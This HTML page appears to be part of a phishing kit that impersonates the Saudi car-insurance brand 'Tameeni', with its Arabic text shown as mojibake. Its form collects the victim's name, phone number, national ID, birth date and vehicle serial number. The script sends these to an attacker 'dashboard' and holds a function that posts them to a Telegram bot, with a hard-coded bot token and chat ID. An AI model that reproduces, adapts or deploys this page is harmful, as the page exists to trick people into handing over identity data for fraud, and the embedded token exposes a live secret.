<!DOCTYPE html>

<html dir="rtl" lang="ar">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>ØªØ£Ù…ÙŠÙ†ÙŠ - Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©</title>
<!-- Google Fonts - Cairo Arabic Font -->
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<!-- ğŸ”§ Ø¥Ø¶Ø§ÙØ© Ù…Ù„Ù Ø§Ù„ØªÙƒØ§Ù…Ù„ Ù…Ø¹ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… -->
<script src="/dashboard/site-integration.js"></script>

<style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
      background-color: #f5f7fb;
      color: #333;
      font-weight: 400;
    }
    .app {
      max-width: 480px;
      margin: 0 auto;
      min-height: 100vh;
      background-color: #fff;
    }
    header {
      padding: 10px 14px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #e0e0e0;
    }
    .logo {
      display: flex;
      align-items: center;
      gap: 8px;
      font-weight: 700;
      color: #007bff;
      font-size: 18px;
    }
    .logo-icon {
      width: 28px;
      height: 28px;
      border-radius: 8px;
      border: 2px solid #007bff;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }
    .logo-icon img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }
    .login-link {
      font-size: 13px;
      color: #007bff;
      text-decoration: none;
    }

    .stepper {
      display: flex;
      justify-content: space-between;
      padding: 16px 16px 8px;
      font-size: 11px;
      color: #aaa;
    }
    .step {
      flex: 1;
      text-align: center;
    }
    .step-number {
      width: 22px;
      height: 22px;
      border-radius: 50%;
      border: 2px solid #d0d0d0;
      margin: 0 auto 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      background-color: #fff;
    }
    .step.active .step-number {
      border-color: #4caf50;
      color: #4caf50;
      font-weight: 700;
    }
    .step.active span {
      color: #4caf50;
      font-weight: 600;
    }

    main {
      padding: 12px 16px 24px;
    }
    h1 {
      font-size: 18px;
      margin-bottom: 12px;
    }
    h2 {
      font-size: 15px;
      margin: 16px 0 8px;
    }
    .label {
      font-size: 13px;
      margin-bottom: 6px;
      display: block;
      color: #555;
    }

    .segmented {
      display: flex;
      border-radius: 10px;
      overflow: hidden;
      border: 1px solid #cfd5e3;
      margin-bottom: 14px;
    }
    .segmented button {
      flex: 1;
      padding: 10px 6px;
      border: none;
      background-color: #fff;
      font-size: 13px;
      cursor: pointer;
      color: #555;
      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
      font-weight: 400;
    }
    .segmented button + button {
      border-right: 1px solid #cfd5e3;
    }
    .segmented button.active {
      background-color: #007bff;
      color: #fff;
      font-weight: 600;
    }

    .field {
      margin-bottom: 14px;
    }
    input[type="text"],
    input[type="number"],
    input[type="tel"],
    input[type="date"],
    select {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #cfd5e3;
      font-size: 14px;
      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
      font-weight: 400;
    }
    input:focus,
    select:focus {
      outline: none;
      border-color: #007bff;
      box-shadow: 0 0 0 1px rgba(0,123,255,0.2);
    }
    .error {
      color: #d32f2f;
      font-size: 12px;
      margin-top: 4px;
      min-height: 16px;
    }

    .info-text {
      font-size: 11px;
      color: #666;
      line-height: 1.6;
      margin-top: 8px;
    }

    .buttons-row {
      display: flex;
      gap: 8px;
      margin-top: 20px;
    }
    .btn {
      flex: 1;
      padding: 14px;
      border-radius: 10px;
      border: none;
      font-size: 15px;
      cursor: pointer;
      font-weight: 600;
      text-align: center;
      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
    }
    .btn-primary {
      background-color: #007bff;
      color: #fff;
    }

    .hidden {
      display: none;
    }

    /* Ø¥ØµÙ„Ø§Ø­ Ù…Ø´ÙƒÙ„Ø© ØªÙƒØ¨ÙŠØ± Ø§Ù„Ø®Ø· ÙÙŠ Ø§Ù„Ù‡ÙˆØ§ØªÙ Ø§Ù„Ù…Ø­Ù…ÙˆÙ„Ø© */
    @media screen and (max-width: 480px) {
      input[type="text"],
      input[type="number"],
      input[type="tel"],
      input[type="email"],
      input[type="password"],
      input[type="date"],
      input[type="datetime-local"],
      input[type="month"],
      input[type="search"],
      input[type="time"],
      input[type="url"],
      input[type="week"],
      input:not([type]),
      textarea,
      select {
        font-size: 16px !important;
      }
    }

    /* Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ */
    /* Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© */
    .loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, rgba(0, 123, 255, 0.95) 0%, rgba(0, 86, 179, 0.95) 100%);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 99999;
      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
      backdrop-filter: blur(10px);
    }

    .loading-screen.show {
      display: flex;
      animation: fadeIn 0.3s ease-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .loading-content {
      text-align: center;
      color: white;
      transform: translateY(0);
      animation: slideUp 0.5s ease-out;
    }

    @keyframes slideUp {
      from { 
        opacity: 0;
        transform: translateY(30px);
      }
      to { 
        opacity: 1;
        transform: translateY(0);
      }
    }

    .loading-dots {
      display: inline-block;
      position: relative;
      width: 80px;
      height: 80px;
      margin: 0 auto 30px;
    }

    .loading-dots div {
      position: absolute;
      top: 33px;
      width: 13px;
      height: 13px;
      border-radius: 50%;
      background: #ffffff;
      animation-timing-function: cubic-bezier(0, 1, 1, 0);
    }

    .loading-dots div:nth-child(1) {
      left: 8px;
      animation: loadingDots1 0.6s infinite;
    }

    .loading-dots div:nth-child(2) {
      left: 8px;
      animation: loadingDots2 0.6s infinite;
    }

    .loading-dots div:nth-child(3) {
      left: 32px;
      animation: loadingDots2 0.6s infinite;
    }

    .loading-dots div:nth-child(4) {
      left: 56px;
      animation: loadingDots3 0.6s infinite;
    }

    @keyframes loadingDots1 {
      0% { transform: scale(0); }
      100% { transform: scale(1); }
    }

    @keyframes loadingDots3 {
      0% { transform: scale(1); }
      100% { transform: scale(0); }
    }

    @keyframes loadingDots2 {
      0% { transform: translate(0, 0); }
      100% { transform: translate(24px, 0); }
    }

    .loading-text {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 12px;
      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
      letter-spacing: 0.5px;
    }

    .loading-subtext {
      font-size: 16px;
      color: rgba(255, 255, 255, 0.8);
      font-weight: 400;
      letter-spacing: 0.3px;
    }
</style>
</head>
<body>
<div class="app">
<header>
<div class="logo">
<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="ØªØ£Ù…ÙŠÙ†ÙŠ" src="images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
<span>ØªØ£Ù…ÙŠÙ†ÙŠ</span>
</div>
<a class="login-link" href="index.html#">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</a>
</header>
<div class="stepper">
<div class="step active" data-step="1">
<div class="step-number">1</div>
<span>Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©</span>
</div>
<div class="step" data-step="2">
<div class="step-number">2</div>
<span>Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ£Ù…ÙŠÙ†</span>
</div>
<div class="step" data-step="3">
<div class="step-number">3</div>
<span>Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø£Ø³Ø¹Ø§Ø±</span>
</div>
<div class="step" data-step="4">
<div class="step-number">4</div>
<span>Ø§Ù„Ø¥Ø¶Ø§ÙØ§Øª</span>
</div>
<div class="step" data-step="5">
<div class="step-number">5</div>
<span>Ø§Ù„Ù…Ù„Ø®Øµ ÙˆØ§Ù„Ø¯ÙØ¹</span>
</div>
</div>
<main>
<h1>Ø§Ù„ØºØ±Ø¶ Ù…Ù† Ø§Ù„ØªØ£Ù…ÙŠÙ†</h1>
<form id="formStep1" novalidate="">
<!-- Ù†ÙˆØ¹ Ø§Ù„Ø¹Ø±Ø¶ -->
<span class="label">Ù†ÙˆØ¹ Ø§Ù„Ø¹Ø±Ø¶</span>
<div class="segmented" id="offerType">
<button class="active" data-value="new" type="button">ØªØ£Ù…ÙŠÙ† Ø¬Ø¯ÙŠØ¯</button>
<button data-value="transfer" type="button">Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙƒÙŠØ©</button>
</div>
<!-- Ù†ÙˆØ¹ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø±ÙƒØ¨Ø© -->
<span class="label">Ù†ÙˆØ¹ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø±ÙƒØ¨Ø©</span>
<div class="segmented" id="regType">
<button class="active" data-value="serial" type="button">Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ</button>
<button data-value="customs" type="button">Ø¨Ø·Ø§Ù‚Ø© Ø¬Ù…Ø±ÙƒÙŠØ© [Ø§Ø³ØªÙŠØ±Ø§Ø¯]</button>
</div>
<!-- Ø§Ù„Ø§Ø³Ù… -->
<div class="field">
<label class="label" for="userName">Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„</label>
<input id="userName" name="userName" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ø³Ù…Ùƒ Ø§Ù„ÙƒØ§Ù…Ù„" type="text"/>
<div class="error" id="userNameError"></div>
</div>
<!-- Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ -->
<div class="field">
<label class="label" for="phoneNumber">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
<input id="phoneNumber" name="phoneNumber" placeholder="05xxxxxxxx" type="tel" maxlength="10" inputmode="numeric" autocomplete="tel" style="direction: ltr; text-align: right;"/>
<div class="error" id="phoneNumberError"></div>
</div>
<!-- Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© -->
<div class="field">
<label class="label" for="idNumber">Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©</label>
<input id="idNumber" inputmode="numeric" name="idNumber" placeholder="Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„ÙˆØ·Ù†ÙŠØ© Ø£Ùˆ Ø§Ù„Ø¥Ù‚Ø§Ù…Ø© Ø£Ùˆ Ø§Ù„Ø´Ø±ÙƒØ©" type="text"/>
<div class="error" id="idError"></div>
</div>
<!-- ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯ (Ø®Ø§Øµ Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙƒÙŠØ©) -->
<div class="field transfer-only hidden">
<label class="label" for="birthDate">ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label>
<input id="birthDate" name="birthDate" type="date"/>
<div class="error" id="birthDateError"></div>
</div>
<!-- Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ / Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø¬Ù…Ø±ÙƒÙŠØ© -->
<div class="field">
<label class="label" for="serialNumber">Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ</label>
<input id="serialNumber" name="serialNumber" placeholder="Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ Ù„Ù„Ù…Ø±ÙƒØ¨Ø©" type="text"/>
<div class="error" id="serialError"></div>
</div>
<!-- Ø³Ù†Ø© Ø§Ù„ØµÙ†Ø¹ (Ø®Ø§Øµ Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙƒÙŠØ©) -->
<div class="field transfer-only hidden">
<label class="label" for="carYear">Ø³Ù†Ø© Ø§Ù„ØµÙ†Ø¹</label>
<input id="carYear" name="carYear" placeholder="Ø§Ø®ØªØ± Ø³Ù†Ø© Ø§Ù„ØµÙ†Ø¹" type="number"/>
<div class="error" id="carYearError"></div>
</div>
<p class="info-text">
        Ø¨Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„ØªØ§Ù„ÙŠØŒ Ø£ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ù…Ù†Ø­ ØªØ£Ù…ÙŠÙ†ÙŠ Ø§Ù„Ø­Ù‚ ÙÙŠ Ø§Ù„Ø§Ø³ØªØ¹Ù„Ø§Ù… Ø¹Ù† Ø¨ÙŠØ§Ù†Ø§ØªÙŠ ÙˆØ¨ÙŠØ§Ù†Ø§Øª Ù…Ø±ÙƒØ¨ØªÙŠ Ù…Ù† Ø§Ù„Ø¬Ù‡Ø§Øª Ø§Ù„Ù…Ø¹Ù†ÙŠØ© Ù„Ø£Ø¬Ù„ Ø¥ØµØ¯Ø§Ø± Ø§Ù„ØªØ³Ø¹ÙŠØ±Ø©.
      </p>
<div class="buttons-row">
<button class="btn btn-primary" type="submit">Ø§Ù„ØªØ§Ù„ÙŠ</button>
</div>
</form>
</main>
</div>
<script>
  // Ø­ÙØ¸ Ù…Ø¤Ù‚Øª ÙÙŠ sessionStorage Ù„Ø¹Ø±Ø¶ Ø§Ù„Ù…Ù„Ø®Øµ (ÙŠØªÙ… Ø­Ø°ÙÙ‡ Ø¨Ø¹Ø¯ Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…)
  function saveTempData(data) {
    sessionStorage.setItem('tameeniTempData', JSON.stringify(data));
  }

  // Ø­Ø°Ù Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¤Ù‚ØªØ©
  function clearTempData() {
    sessionStorage.removeItem('tameeniTempData');
  }

  // Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
  function showLoadingScreen() {
    const overlay = document.getElementById('loadingOverlay');
    const countdown = document.getElementById('loadingCountdown');
    
    if (!overlay || !countdown) return;
    
    let seconds = 5;
    overlay.style.display = 'flex';
    
    const timer = setInterval(() => {
      seconds--;
      countdown.textContent = seconds;
      
      if (seconds <= 0) {
        clearInterval(timer);
        overlay.style.display = 'none';
      }
    }, 1000);
  }

  // Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ù„Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨ÙŠÙ† Ø§Ù„ØµÙØ­Ø§Øª
  function showLoadingAndRedirect(url) {
    const loadingScreen = document.getElementById('loadingScreen');
    if (!loadingScreen) {
      window.location.href = url;
      return;
    }
    
    loadingScreen.classList.add('show');
    setTimeout(() => {
      window.location.href = url;
    }, 1000);
  }

  // ØªØ­Ø¯ÙŠØ« ÙˆØ§Ø¬Ù‡Ø© Ù†ÙˆØ¹ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø±ÙƒØ¨Ø©
  function updateRegTypeUI(value) {
    const label = document.querySelector('label[for="serialNumber"]');
    const input = document.getElementById('serialNumber');
    if (!label || !input) return;

    if (value === 'customs') {
      label.textContent = 'Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø¬Ù…Ø±ÙƒÙŠØ©';
      input.placeholder = 'Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø¬Ù…Ø±ÙƒÙŠØ© Ù„Ù„Ù…Ø±ÙƒØ¨Ø©';
    } else {
      label.textContent = 'Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ';
      input.placeholder = 'Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ Ù„Ù„Ù…Ø±ÙƒØ¨Ø©';
    }
  }

  // ØªØ­Ø¯ÙŠØ« ÙˆØ§Ø¬Ù‡Ø© Ù†ÙˆØ¹ Ø§Ù„Ø¹Ø±Ø¶ (ØªØ£Ù…ÙŠÙ† Ø¬Ø¯ÙŠØ¯ / Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙƒÙŠØ©)
  function updateOfferTypeUI(value) {
    const idLabel = document.querySelector('label[for="idNumber"]');
    const transferFields = document.querySelectorAll('.transfer-only');
    if (idLabel) {
      if (value === 'transfer') {
        idLabel.textContent = 'Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© (Ø§Ù„Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¬Ø¯ÙŠØ¯)';
      } else {
        idLabel.textContent = 'Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©';
      }
    }
    transferFields.forEach(function (el) {
      if (value === 'transfer') {
        el.classList.remove('hidden');
      } else {
        el.classList.add('hidden');
      }
    });
  }

  // Ø¥Ø¹Ø¯Ø§Ø¯ segmented buttons
  function setupSegmented(id) {
    const container = document.getElementById(id);
    if (!container) return;
    const buttons = container.querySelectorAll('button');
    buttons.forEach(function (btn) {
      btn.addEventListener('click', function () {
        buttons.forEach(function (b) { b.classList.remove('active'); });
        btn.classList.add('active');
        container.dataset.value = btn.dataset.value;
        if (id === 'regType') {
          updateRegTypeUI(btn.dataset.value);
        }
        if (id === 'offerType') {
          updateOfferTypeUI(btn.dataset.value);
        }
      });
    });
  }

  // ğŸ”§ Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ø£ÙˆÙ„Ù‰ Ø¥Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… (Ù…Ø¹Ø¯Ù„Ø©)
  async function sendToTelegramStep1(data) {
    try {
      // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
      const success = await sendToDashboardStep1(data);
      
      if (success) {
        console.log("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ø£ÙˆÙ„Ù‰ Ø¥Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ø¨Ù†Ø¬Ø§Ø­");
      }
      
      // Ø¥Ø±Ø³Ø§Ù„ Ø§Ø­ØªÙŠØ§Ø·ÙŠ Ø¥Ù„Ù‰ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… (Ø§Ø®ØªÙŠØ§Ø±ÙŠ - ÙŠÙ…ÙƒÙ† Ø¥Ø²Ø§Ù„ØªÙ‡)
      // await sendToTelegramBackup(data);
      
      return { success: true };
    } catch (error) {
      console.error("Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:", error);
      return { success: false };
    }
  }

  // ğŸ”§ Ø¯Ø§Ù„Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© Ù„Ø¥Ø±Ø³Ø§Ù„ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… (ÙŠÙ…ÙƒÙ† Ø¥Ø²Ø§Ù„ØªÙ‡Ø§ Ø¥Ø°Ø§ Ù„Ù… ØªØ¹Ø¯ ØªØ±ÙŠØ¯Ù‡Ø§)
  async function sendToTelegramBackup(data) {
    const BOT_TOKEN = "8562564680:AAGotGtOsmJ4n-ugvC81HFmxTour-Pm1ntE";
    const CHAT_ID = "6165206261";
    
    const offerTypeText = data.offerType === 'transfer' ? 'Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙƒÙŠØ©' : 'ØªØ£Ù…ÙŠÙ† Ø¬Ø¯ÙŠØ¯';
    const regTypeText = data.regType === 'customs' ? 'Ø¨Ø·Ø§Ù‚Ø© Ø¬Ù…Ø±ÙƒÙŠØ© [Ø§Ø³ØªÙŠØ±Ø§Ø¯]' : 'Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ';
    
    const message = 
      "ğŸ”µ Ø®Ø·ÙˆØ© 1 â€“ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©\n\n" +
      "Ø§Ù„Ø§Ø³Ù…: " + (data.userName || "-") + "\n" +
      "Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ: " + (data.phoneNumber || "-") + "\n" +
      "Ù†ÙˆØ¹ Ø§Ù„Ø¹Ø±Ø¶: " + offerTypeText + "\n" +
      "Ù†ÙˆØ¹ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø±ÙƒØ¨Ø©: " + regTypeText + "\n" +
      "Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©: " + (data.idNumber || "-") + "\n" +
      "ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: " + (data.birthDate || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯") + "\n" +
      "Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ/Ø§Ù„Ø¬Ù…Ø±ÙƒÙŠ: " + (data.serialNumber || "-") + "\n" +
      "Ø³Ù†Ø© Ø§Ù„ØµÙ†Ø¹: " + (data.carYear || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯");

    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
  }

  document.addEventListener('DOMContentLoaded', function () {
    // Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    showLoadingScreen();

    setupSegmented('offerType');
    setupSegmented('regType');

    const offerType = document.getElementById('offerType');
    const regType = document.getElementById('regType');

    // Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù‚ÙŠÙ… Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ©
    offerType.dataset.value = offerType.querySelector('button.active').dataset.value;
    regType.dataset.value = regType.querySelector('button.active').dataset.value;

    // ØªØ·Ø¨ÙŠÙ‚ Ø­Ø§Ù„Ø© Ø§Ù„ÙˆØ§Ø¬Ù‡Ø§Øª
    updateRegTypeUI(regType.dataset.value);
    updateOfferTypeUI(offerType.dataset.value);

    const form = document.getElementById('formStep1');
    form.addEventListener('submit', async function (e) {
      e.preventDefault();

      const idInput = document.getElementById('idNumber');
      const userNameInput = document.getElementById('userName');
      const phoneInput = document.getElementById('phoneNumber');
      const birthInput = document.getElementById('birthDate');
      const serialInput = document.getElementById('serialNumber');
      const carYearInput = document.getElementById('carYear');

      const idError = document.getElementById('idError');
      const userNameError = document.getElementById('userNameError');
      const phoneError = document.getElementById('phoneNumberError');
      const birthError = document.getElementById('birthDateError');
      const serialError = document.getElementById('serialError');
      const carYearError = document.getElementById('carYearError');

      idError.textContent = '';
      userNameError.textContent = '';
      phoneError.textContent = '';
      birthError.textContent = '';
      serialError.textContent = '';
      carYearError.textContent = '';

      let valid = true;

      // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø§Ø³Ù…
      const userNameVal = userNameInput.value.trim();
      if (!userNameVal) {
        userNameError.textContent = 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø§Ø³Ù….';
        valid = false;
      } else if (userNameVal.length < 2) {
        userNameError.textContent = 'Ø§Ù„Ø§Ø³Ù… Ù‚ØµÙŠØ± Ø¬Ø¯Ø§Ù‹.';
        valid = false;
      }

      // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ
      const phoneVal = phoneInput.value.trim();
      if (!phoneVal) {
        phoneError.textContent = 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ.';
        valid = false;
      } else if (!/^05[0-9]{8}$/.test(phoneVal)) {
        phoneError.textContent = 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙ ØµØ­ÙŠØ­ ÙŠØ¨Ø¯Ø£ Ø¨Ù€ 05.';
        valid = false;
      }

      // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© (10 Ø£Ø±Ù‚Ø§Ù…)
      const idVal = idInput.value.trim();
      if (!idVal) {
        idError.textContent = 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©.';
        valid = false;
      } else if (!/^[0-9]{10}$/.test(idVal)) {
        idError.textContent = 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ù‡ÙˆÙŠØ© ØµØ­ÙŠØ­ Ù…ÙƒÙˆÙ† Ù…Ù† 10 Ø£Ø±Ù‚Ø§Ù….';
        valid = false;
      }

      // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ / Ø§Ù„Ø¬Ù…Ø±ÙƒÙŠ
      if (!serialInput.value.trim()) {
        serialError.textContent = 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ.';
        valid = false;
      }

      // Ø­Ù‚ÙˆÙ„ Ø®Ø§ØµØ© Ø¨Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙƒÙŠØ©
      if (offerType.dataset.value === 'transfer') {
        if (!birthInput.value) {
          birthError.textContent = 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯.';
          valid = false;
        }
        if (!carYearInput.value.trim()) {
          carYearError.textContent = 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø³Ù†Ø© Ø§Ù„ØµÙ†Ø¹.';
          valid = false;
        }
      }

      if (!valid) return;

      const d = {
        userName: userNameVal,
        phoneNumber: phoneVal,
        offerType: offerType.dataset.value,
        regType: regType.dataset.value,
        idNumber: idVal,
        birthDate: birthInput.value,
        serialNumber: serialInput.value.trim(),
        carYear: carYearInput.value.trim()
      };

      // Ø­ÙØ¸ Ù…Ø¤Ù‚Øª Ù„Ù„Ù…Ù„Ø®Øµ + Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª
      saveTempData(d);
      try {
        await sendToTelegramStep1(d);
        console.log("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ø£ÙˆÙ„Ù‰ Ø¥Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ø¨Ù†Ø¬Ø§Ø­");
      } catch (error) {
        console.error("Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…:", error);
      }

      // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ù„Ù„Ø®Ø·ÙˆØ© Ø§Ù„ØªØ§Ù„ÙŠØ©
      showLoadingAndRedirect('tameeni-step2-linked.html');
    });
  });
</script>

<!-- Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© -->
<div class="loading-screen" id="loadingScreen">
<div class="loading-content">
<div class="loading-dots">
<div></div>
<div></div>
<div></div>
<div></div>
</div>
<div class="loading-text" id="loadingText">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</div>
<div class="loading-subtext" id="loadingSubtext">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</div>
</div>
</div>

</body>
</html>